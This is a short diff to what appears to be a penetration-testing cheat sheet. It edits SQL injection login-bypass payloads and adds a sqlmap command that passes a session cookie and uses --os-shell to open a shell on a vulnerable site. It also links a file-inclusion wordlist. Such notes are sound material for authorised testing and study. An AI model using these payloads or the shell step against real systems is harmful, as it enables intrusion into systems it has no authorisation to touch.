@@ -259,7 +259,8 @@ Whatweb <target> or <target/range>
 ***Injection sql***
 ```sql
 login: ` OR '1'='1' --
-login: admin'# 
+login: admin'#
+sqlmap -u 'url' --cookie=<cookiesession> // if vuln --os-shell open a shell
 ```
 # File inclusion
 [File inclusion](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt)
